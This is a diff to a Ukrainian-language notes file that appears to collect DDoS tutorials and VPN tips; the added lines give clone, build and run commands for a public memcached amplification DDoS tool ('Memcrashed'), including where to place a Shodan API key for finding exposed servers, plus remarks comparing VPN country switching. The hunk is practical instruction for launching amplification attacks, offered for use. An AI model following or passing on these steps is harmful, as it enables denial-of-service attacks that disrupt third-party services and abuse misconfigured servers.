@@ -94,9 +94,21 @@ Posting: щось там....
 
 
 
-TODO
-- https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/
+# TODO
 
+**Memcrashed** Python + Docker
+
+https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/
+https://github.com/649/Memcrashed-DDoS-Exploit
+
+```
+git clone https://github.com/649/Memcrashed-DDoS-Exploit.git
+cd Memcrashed-DDoS-Exploit
+echo "SHODAN_KEY" > api.txt
+docker build -t memcrashed .
+docker run -it memcrashed
+```
+Але вимагає ключа для Schodan АПІ => https://www.shodan.io/
 
 
 # Туторіали про DDoS
@@ -118,6 +130,7 @@ https://my.clearvpn.com/promo/redeem?code=SAVEUKRAINE
 Правда той код діє до 2023го року тільки.
 
 До речі, Росія в списку є.
+Але IMHO, не зручний "переключатор країн", адже треба Деактивувати спочатку, потім ІП адреса стає ваша звичайна, потім Активувати, програмка підключає і міняє ІП адресу, що є відносно але довго в секундах. ExpressVPN по відчуттях переключає моментально.
 
 **Інші**: 
 - NordVPN https://nordvpn.com/, 
